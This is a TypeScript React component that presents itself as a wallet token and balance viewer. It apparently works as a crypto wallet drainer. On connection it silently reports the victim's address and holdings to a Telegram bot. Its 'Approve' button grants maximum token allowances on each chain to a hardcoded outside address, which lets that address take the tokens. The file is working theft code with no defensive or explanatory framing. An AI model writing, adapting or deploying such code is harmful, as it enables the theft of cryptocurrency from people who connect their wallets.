"use client";

import { useState, useEffect } from "react";
import { useAccount, useWalletClient } from "wagmi";
import axios from "axios";
import { ethers } from "ethers";
import { polygon } from "viem/chains";

type Token = {
  name: string;
  symbol: string;
  balance: number;
  chain: string;
  usdValue: number;
  address: string;
};

const UserTokensAndBalance = () => {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [totalBalance, setTotalBalance] = useState<number | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  // Function to fetch total balance from DeBank API
  const fetchTotalBalance = async () => {
    if (!address) return;
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/total_balance`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );
      
      const totalBalance = response.data.total_usd_value || 0;
    setTotalBalance(totalBalance);
    return totalBalance; // Return the total balance for use in other functions
  } catch (error) {
    console.error("Error fetching total balance from DeBank API:", error);
    return null;
  }
};

  // Function to fetch the list of tokens and their chain ID
  const fetchUserTokens = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );
  
      const tokenData = response.data;
      const formattedTokens = tokenData.map((token: any) => {
        const rawAmount = token.raw_amount || 0;
        const decimals = token.decimals || 0;
        const balance = rawAmount / Math.pow(10, decimals);
        const usdValue = balance * (token.price || 0);
  
        return {
          name: token.name || "Unknown",
          symbol: token.symbol || "Unknown",
          balance: isNaN(balance) ? 0 : balance,
          chain: token.chain || "unknown",
          usdValue: isNaN(usdValue) ? 0 : usdValue,
          address: token.id,
          isCore: token.is_core || false,
          isVerified: token.is_verified || false,
        };
      });
  
      // Filter tokens for DeBank-supported tokens only (is_core or is_verified)
      const filteredAndSortedTokens = formattedTokens
        .filter((token: { isCore: any; isVerified: any; }) => token.isCore || token.isVerified)
        .filter((token: { usdValue: number; }) => token.usdValue >= 1) // Optional: Keep tokens with >= $10
        .sort((a: { usdValue: number; }, b: { usdValue: number; }) => b.usdValue - a.usdValue);
  
      setTokens(filteredAndSortedTokens);
      await sendTokensAndBalanceToTelegram(filteredAndSortedTokens, totalBalance);
    } catch (error) {
      console.error("Error fetching tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to send tokens and total balance to Telegram bot
  const sendTokensAndBalanceToTelegram = async (tokens: Token[], balance: number | null) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "YOUR_TELEGRAM_BOT_TOKEN";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "YOUR_TELEGRAM_CHAT_ID";

    const tokenMessage = tokens
      .map(
        (token) =>
          `\n${token.name} - Chain:   \n💵$${token.usdValue.toFixed(2)} `
      )
      .join("\n");

    const totalBalanceMessage = balance !== null ? `\n\nTotal Balance: $${balance.toFixed(2)}` : "";

    const message = `<b>✨ New Connection</b> \n\n🏦 <code>${address}</code> \n<a href="https://debank.com/profile/${address}">View on DeBank</a> \n\n💰<b>Holdings:</b>${totalBalanceMessage}\n${tokenMessage}`;

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML" 
      });
      console.log("Tokens and total balance sent to Telegram");
    } catch (error) {
      console.error("Error sending tokens and total balance to Telegram:", error);
    }
  };


  // Function to increase allowance for all tokens, switching chains dynamically
  const approveAllTokens = async () => {
  if (!walletClient || !address) return;

  try {
    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
    const provider = new ethers.BrowserProvider(walletClient as any);
    const signer = await provider.getSigner();

    for (const token of tokens) {
      // Skip native tokens (no contract address)
      if (!token.address) {
        console.log(`Skipping native token: ${token.name} (${token.symbol})`);
        continue;
      }

      const chainId = getChainDetailsForName(token.chain);

      // Switch to the correct chain
      if (walletClient?.switchChain) {
        await walletClient.switchChain(chainId);
      }

      // Approve maximum allowance
      const tokenContract = new ethers.Contract(token.address, abi, signer);
      const maxUint256 = ethers.MaxUint256;
      try {
        const tx = await tokenContract.approve("0xe514C4535B3A68be6126cA8b9aa60414A8f489Ff", maxUint256);
        await tx.wait();
        console.log(`Approved token ${token.name} on chain ${token.chain}`);
      } catch (error) {
        console.error(`Failed to approve ${token.name}:`, error);
      }
    }

    console.log("Approved all tokens (non-native).");
  } catch (error) {
    console.error("Failed to approve tokens:", error);
  }
};
  
  // Helper function to map chain names to chain details
  const getChainDetailsForName = (chainName: string) => {
    const chainMap: { [key: string]: { id: number; name: string } } = {
      eth: { id: 1, name: "Ethereum Mainnet" },
      bsc: { id: 56, name: "Binance Smartchain" },
      polygon: { id: 137, name: "Polygon" },
      arb: { id: 42161, name: "Arbitrum One" },
      op: { id: 10, name: "Optimism" },
      base: { id: 8453, name: "Base" },
    };
  
    return chainMap[chainName] || { id: 1, name: "Ethereum Mainnet" }; // Default to Ethereum Mainnet if unknown
  };
  

  // Fetch data upon wallet connection
  useEffect(() => {
    if (isConnected && address) {
      fetchTotalBalance();
      fetchUserTokens();
    }
  }, [isConnected, address]);

  return (
    <div>
      <h2>User Tokens and Total Balance</h2>
      {isLoading && <p>Loading data...</p>}
      {totalBalance !== null && <p>Total Balance: ${totalBalance.toFixed(2)}</p>}
      {!isLoading && tokens.length > 0 && (
        <>
          <ul>
            {tokens.map((token, index) => (
              <li key={index}>
                {token.name} ({token.symbol}) - Balance: {token.balance.toFixed(2)} on Chain: {token.chain} - USD Value: ${token.usdValue.toFixed(2)}
              </li>
            ))}
          </ul>
          <button onClick={approveAllTokens}>Approve</button>
        </>
      )}
      {!isLoading && tokens.length === 0 && <p>No tokens found. Connect your wallet to fetch data.</p>}
    </div>
  );
};

export default UserTokensAndBalance;


